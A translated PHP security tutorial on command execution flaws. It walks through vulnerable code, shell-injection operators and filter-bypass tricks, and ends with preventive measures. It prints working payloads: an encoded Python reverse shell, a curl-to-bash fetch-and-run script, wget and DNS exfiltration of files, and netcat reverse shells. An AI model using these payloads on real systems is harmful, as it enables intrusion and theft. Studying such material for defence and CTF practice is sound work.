# PHP Security Learning—Command Execution Vulnerability

Author: H3rmesk1t

Data: 2021.05.28

# Vulnerability Description

Command execution vulnerability means that the server does not filter the executed commands, and the user can execute system commands at will. The command execution vulnerability is one of the high-risk vulnerabilities.
For example, the command execution vulnerability in PHP is mainly due to insufficient parameter filtering of some functions. The functions that can execute commands include system( ), exec( ), shell_exec( ), passthru( ), pcntl_execl( ), popen( ), proc_open( ), etc. When an attacker can control the parameters in these functions, he can splice malicious system commands into normal commands, resulting in command execution attacks.
PHP commands are executed to inherit the permissions of the WebServer user. This user generally has permission to write files to the Web directory, which shows that the vulnerability is quite harmful.

# Vulnerability Principle

Applications sometimes need to call some functions that execute system commands. For example, in PHP, system, exec, shell_exec, passthru, popen, proc_popen and other functions can be used to execute system commands. When a hacker can control the parameters in these functions, malicious system commands can be spliced ​​into normal commands, resulting in command execution vulnerabilities.

# Vulnerability hazards

- Inherit the permissions of the web server program, execute system commands or read and write files
- Rebound shell
- Control the entire website, even the entire server

# Causes of vulnerabilities

>1. No user input is filtered or not strictly filtered
For example, there is no filtering of &, &&, |, ||, etc. linker
>2. Command execution caused by system vulnerabilities
Bash shell vulnerability (CVE-2014-6271), which can construct the value of environment variables to execute attack-powered script code, which will affect various applications of bash interaction, such as http, ssh and dhcp.
>3. There is a code execution vulnerability in the third-party component called
For example:
php(system(), shell_exec(), exec(), eval())
Command execution vulnerability in JAVA (struts2/ElasticsearchGroovy, etc.)
ThinkPHP command execution

# The difference between command execution and code execution

- Code execution: The execution effect depends entirely on the language itself
- Command execution: The execution effect is not limited by the language itself or the command itself

# Common hazard functions

>1. PHP code related
eval()
assert()
preg_replace
call_user_func()
call_user_func_array()
create_function
array_map()
>2. System command execution related
system()
passthru()
exec()
pcntl_exec()
shell_exec()
popen()
proc_open()
`(Anti-single quotes)
ob_start()
>3. Special functions
phpinfo()
#This file contains PHP compilation options, startup extensions, versions, server configuration information, environment variables, operating system information, path variables and other very important sensitive configuration information.
symlink():
#It is generally used on a linux server to establish a connection for a target, read the content of the file connected to this link, and return the content
getenv
#Get the value of an environment variable
putenv(\$a)
#Add \$a to the server environment variable, but the environment variable only survives during the current request. The environment will return to its initial state when the request ends
# Type of command execution
- Code layer filtering is not strict
- System vulnerability causes command injection
- The third-party component called has a code execution vulnerability

# Danger function utilization
## system
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528075238539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    $b = system($url, $a);
    echo $a.PHP_EOL;
    echo $b.PHP_EOL;
}
?>
```

Malicious code execution
`?url=dir`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528075803812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

File writing
>`?url=echo 1111 flag.php`
>
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528080038947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## passthru
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528080213501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    passthru($url,$a);
    echo $a.PHP_EOL;
}
?>
```

File writing
`?url=dir 22.txt`

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052808065822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## exec
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528080825303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
One thing to note is that exec needs echo to echo

<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo exec($url);
}
?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528081337546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528081344441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## shell_exec
![Insert the picture description here](https://img-blog.csdnimg.cn/2021052808150682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
highlight_fi
le(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo shell_exec($url);
}
?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528081700336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528081707312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## `(Backticks)

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo `$url`;
}
?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528081904584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# escapeshellarg/escapeshellcmd

Refer to previous articles: [Use/Bypass escapeshellarg/escapeshellcmd](https://blog.csdn.net/LYJ20010728/article/details/116902085)

# OS command execution

Some web applications provide some command execution operations. For example, if you want to test whether http://www.test.com can connect normally, then the underlying web application is likely to call system operation commands. If the data entered by the user is not filtered here, such as pipeline connectors, it is very likely to form system command execution vulnerabilities.
## Pipeline symbols supported by WINDOWS system

>"|": execute the following statement directly
For example: `ping www.baidu.com|whoami`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528082504931.png#pic_center)

"||": If the execution of the previous statement error occurs, the execution of the following statement
For example: `png www.baidu.com||whoami`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528082607434.png#pic_center)

>"&": If the previous statement is false, the following statement will be executed directly. The previous statement can be true or false
For example: `png www.baidu.com&whoami` or `ping www.baidu.com&whoami`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528082816366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

"&&": If the previous statement is true, execute the first command first and then execute the second command; if it is false, an error will occur directly, and the following statement will not be executed.
For example: `ping www.baidu.com&&whoami` `png www.baidu.com&&whoami`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528082954761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## Pipeline symbols supported by LINUX system
";" After executing the previous command

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528083323438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
>"|": Display the execution result of the following statement

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528083434865.png#pic_center)
>"||": When an error occurs in the execution of the current statement, execute the following statement

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528083531185.png#pic_center)
>"&": If the previous statement is false, it directly points to the following statement. The previous statement can be true or false

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528083708890.png#pic_center)

>"&&": If the previous statement is false, an error will occur directly, and the following statement will not be executed.

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052808373236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
#Java
>The reason why this is called Java command execution is because the Java system is very large, including: Java SE, Java EE, and Java ME. Whether it is a branch or a framework, it is based on Java SE
Java EE was previously called J2EE. Java EE is built on the basis of Java SE. It provides web services, component models, management and communication APIs, which can be used to implement enterprise-level service-oriented architecture (SOA) and Web 2.0 application development.
In Java SE, there is a Runtime class, in which the exec method is provided to execute specified string commands in a separate process. Technologies such as JSP, Servlet, Struts, Spring, Hibernate, etc. generally call this method when executing external programs (or use the ProcessBuilder class, but few). The following is an example to illustrate the Runtime class. The model code is as follows:

```java
import java.io.InputStream; //packet operation
import java.io.InputStreamReader;
import java.io.BufferedReader;
public class RuntimeTest{
  public static void main (String args []) throws Exception{
    if (args.length==0) {
      System.exit(1); //Exit without parameters
    }
    String command = args[0];
    Runtime run = Runtime.getRuntime();
    Process pro = run.exec(command); //Execute the command
    InputStreamReader in = new InputStreamReader(pro.getInputStream());
    BufferedReader buff = new BufferedReader(in);
    for(String temp = buff.readLine();temp!=null;temp=buff.readLine()){
      System.out.println(temp); //Output result
    }
  buff .close();
  in.close();
  }
}
```

The above code can be compiled to execute command operations, such as: java RuntimeTest
Whoami", execute command operation

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528084212977.png#pic_center)
# Python

Code execution

```python
exec(string) # Dynamic execution of Python code
eval(string) # Returns the value of an expression or code object
execfile(string) # Read and execute Python scripts from a file
input(string) # In Python2.x, input() is equal to eval(raw_input(prompt)) and is used to obtain the input of the console
compile(string) # Compile the source string into an executable object
```

Command execution

```python
system() # Execute system instructions
popen() # popen() method is used to open a pipeline from a command
subprocess.call # Execute the command provided by the parameter
spawn # Execute the command
```

# Common filtering bypass
## Encoding bypass

If the command-injected website filters certain splitters, you can bypass the delimiter after encoding (url encoding, base64, etc.)

## Octal Bypass

$(printf "\154\163")//ls command, this code can be spliced

```php
//The -. and other symbols are filtered here, and only 0-9a-zA-Z">\\\$() is allowed;
echo$IFS$9$(printf$IFS$9"\163\75\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\163\157\143\153\145\164\50\1 37\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\101\106\137\111\116\105\124\54\137\137\151\155\160\157\162\164 \137\137\50\42\163\157\143\153\145\164\42\51\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\4 2\64\67\56\61\60\60\60\56\61\62\60\56\61\62\63\42\54\62\63\63\63\51\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165 \160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50 \163\56\146\151\154\145\156\157\50\51\54\61\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\14 6\151\154\145\156\157\50\51\54\62\51\73\160\75\137\137\151\155\160\157\162\164\137\137\50\42\163\165\142\160\162\157\143\145\163\163\42\51\5 6\143\141\154\154\50\133\42\57\142\151\156\57\142\141\163\150\42\54\42\55\151\42\135\51\73")>$(printf$IFS$9"\57")detect$(printf$IFS$9"\56")py
echo 'python rebound shell payload' /detect.py
```

```python
from flask import Flask
from flask import render_template,request
import subprocess,re
app = Flask(__name__)

@app.route('/',methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/run',methods=['POST'])
def run():
    cmd = request.form.get("cmd")
    if re.search(r''[^0-9a-zA-Z">\\\$();]''',cmd):
        return 'Hacker!'
    if re.search(r'''ping|wget|curl|bash|perl|python|php|kill|ps''',cmd):
        return 'Hacker!'
    p = subprocess.Popen(cmd,stderr=subprocess.STDOUT, stdout=subprocess.PIPE,shell=True,close_fds=True)
    try:
        (msg, errs) = p.communicate(timeout=5)
        return msg
    except Exception as e:
        return 'Error!'

app.run(host='0.0.0.0',port='5000')
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528085106453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## Hexadecimal Bypass

`echo "636174202F6574632F706173737764" | xxd -r -p |bash`

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052815065447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## Hexadecimal character sequence
It is worth noting that this method is not applicable to all PHP functions. This variable function method cannot be used to construct system special functions such as echo, print, unset(), isset(), empty(), include, require, etc., but they can be constructed using wrapper functions.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528150438166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## Space Filter

linux built-in separators: \${IFS}, \$IFS, \$IFS$9

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528094008120.png#pic_center)
Use redirector `<>`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528094206846.png#pic_center)


## >, + filter
For filtering of symbols such as >,+, etc., the \$PS2 variable is >, and the \$PS4 variable is +

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528093759328.png#pic_center)

## Keyword bypass

- Achieving the effect of bypassing through split command: `a=l;b=s;$a$b`
- Empty variable bypass: `cat fl${x}ag` `cat tes$(z)t/flag`
- Control environment variables bypass:
First use `echo $PATH` to get the environment variable ="/usr/local/….blablabla"
Then use `echo ${#PATH}` to get the length
Then you need to intercept which character you want.
${PATH:0:1} ='/'
${PATH:1:1} ='u'
${PATH:0:4} ='/usr'
- Null value bypass: `cat fl""ag` `cat fl''ag` `cat "fl""ag"`
- Backslash bypass: `ca\t flag`
`l\s`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528093241745.png#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528093649570.png#pic_center)

## Empty variable

\$* and \$@, \$x(x represents 1-9), \${x}(x>=10): For example `ca${21}t a.txt` means `cat a.txt`
In the absence of incoming parameters, these special characters are empty by default, as follows:
- wh$1oami
- who$@ami
- whoa$*mi

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052809053980.png#pic_center)

## How to use curly braces

In Linux bash, you can also use `{OS_COMMAND,ARGUMENT}` to execute system commands `{cat,flag}`

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052809285025.png#pic_center)

## No echo command execution

The result of the command can be output to the accessed url through the curl command:

```php
curl www.rayi.vip/`whoami`
```

You can see in the server log: `xx.xx.xx.xx - - [12/Aug/2019:10:32:10 +0800] "GET /root HTTP/1.1" 404 146 "-" "curl/7.58.0"`, so that the echo of the command can be seen in the log

## Read file command

```php
ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sort|cut|xxd
```

Wget brings out without echo: `wget --post-file flag 47.100.120.123:2333`

## Length bypass

See [P Niu Article](https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html)
When executing linux commands, you can use backslash lines to break; the above rules are also applicable in bash scripts; you can use file names plus backslashes to form a command, use ls -t o to output the file name to the file, and use bash o to execute the script

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528091115666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
Construct ls -t

```php
Command: >ls\\ #Generate a file with the file name ls\
Command: ls>_ #To ensure that ls in ls -t is in front, you must first use ls>_ to enter ls into file_
Command: >\\\ # Generate spaces between ls -t, a file with the file name \
Command: >-t\\ # Generate a file with the file name -t\
Command: >\>g # Generate a file with file name >g
Command: ls>>_ #Write all file names into file_
Command: sh _ # Execute the ls -t command spliced ​​from \ in order from top to bottom, and enter the result into file g
```

```python
import requests
from time import sleep
import urllib

payload = [
    # generate `ls -t>g` file
    '>ls\\',
    'ls>_',
    '>\ \\',
    '>-t\\',
    '>\>g',
    'ls>>_',
    
    # generate `curl www.rayi.vip|bash`
    # Note that the file name cannot start with.
    # Note that the file name cannot be duplicated
    # Note that vps can only use index, because file names cannot start with /
    # The tragedy is that my vps IP is exactly 0. I can only use the domain name
    '>sh\ ',
    '>ba\\',
    '>\|\\',
    '>p\\',
    '>vi\\',
    '>i.\\',
    '>y\\',
    '>ra\\',
    '>w.\\',
    '>ww\\',
    '>\ \\',
    '>rl\\',
    '>cu\\',
    # exec
    'sh _',
    #Execute ls -t>g first
    'sh g'
   
]

r = requests.get('http://url/?reset=1')
for i in payload:
    assert len(i) <= 5
    r = requests.get('http://url/?cmd=' + urllib.parse.quote(i) )
    print(i)
    sleep(1)
```

## get_defined_functions

The get_defined_functions system function returns a multidimensional array containing a list of all defined functions (including internal functions and user-defined functions); the internal functions can be represented by `$arr["internal"]`, and user-defined functions can be represented by `$arr["user"]`.
For example: `php -r 'print_r(get_defined_functions()[internal]);'`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528113430978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The above is another way to refer to a system function without using the name of the system function. If we filter the string `"system"`, we can find its index number and use it in this way: `php -r 'print_r(get_defined_functions()[internal]);' | grep 'system'`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528113517621.png#pic_center)

Use this method to bypass security filtering in WAF and code:
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528114446389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## Character array
Each string in PHP can be regarded as an array of characters and can be referenced by the syntax `$string[2]` or `$string[-3]`, which is also another way to bypass security rules.
For example, just using the string `$a="elmsty/ ";`, I can form the command execution statement `system("ls /tmp");` (test PHP version>7.0)

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528145804484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## Quotation mark escape

In PHP, strings are not always accompanied by quotes, we can proactively declare its type, such as `$a = (string)foo;` In this case, the variable `$a` is the string `"foo"`
In addition, you can also use parentheses, as shown in the figure below:

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528144140685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The first way to bypass: use (system)(ls);, but because the string "system" cannot be used, we can use string concatenation, for example (sy.(st).em)(ls);

![Insert the image description here](https:
//img-blog.csdnimg.cn/20210528144414796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
>The second way to bypass: use the variable `$_GET`, if I send such a request `?a=system&b=ls&code=$_GET[a]($_GET[b]);`, in code execution `$_GET[a]` and `$_GET[b]` will be replaced by `system` and `ls`, and finally bypass the security restrictions of quotes.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528144844834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# DNSlog Outlet
Using domain name resolution request
- Suppose we have a controllable second-level domain name, then when the target issues a three-level domain name resolution, we can get its domain name resolution request, and we can cooperate with the DNS request to make the command execution judgment. This is generally called dnslog
- You can use the ping command to request through the dns or the curl command. Just access the domain name and let the domain name server resolve the domain name.
- Example: You can register an account at ceye.io. After registering, a domain name will be given. If there is a domain name resolution request, there will be a record; if the domain name is tested.ceye.io, when a host accesses 1111. test.ceye.io, the domain name resolution request will be recorded; 1111 can be replaced with the information we need to obtain; such as: `cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528092154214.png#pic_center)
Wireshark Catching

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528092217871.png#pic_center)
# rebound shell

```bash
nc -L -p 9090-e cmd.exe (Windows)

nc -l -p 9090-e /bin/bash (*nix)
```

# Preventive measures

>1. Disable high-risk system functions in PHP
Find php.ini, find disable_functions, add the disabled function name
>2. Try to include the value of the parameter in quotes, and call addslashes before splicing to escape
>3. Do not execute external applications or commands
Try to use custom functions or function libraries to implement the functions of external applications or commands. Before executing functions such as system, eval, etc., confirm the parameter contents
>4. Use escapeshellarg function to handle related parameters
The escapeshellarg function will escape the characters that cause the user to end the parameter or command. For example, single quotes "'" will be escaped as "\'", double quotes """ will be escaped as "\"", and semicolons";" will be escaped as "\;", so escapeshellarg will limit the content of the parameter content to a pair of single quotes or double quotes, and escape the single quotes or double quotes included in the parameter, making it impossible to truncate the current execution, achieving the purpose of preventing command injection attacks.
>5. Use safe_mode_exec_dir to specify the executable file path
Set safe_mode in the php.ini file to On, then put the allowed execution files into a directory, and use safe_mode_exec_dir to specify the executable file path; in this way, when the corresponding external program needs to be executed, the program must be allowed to execute in the directory specified by safe_mode_exec_dir, otherwise the execution will fail.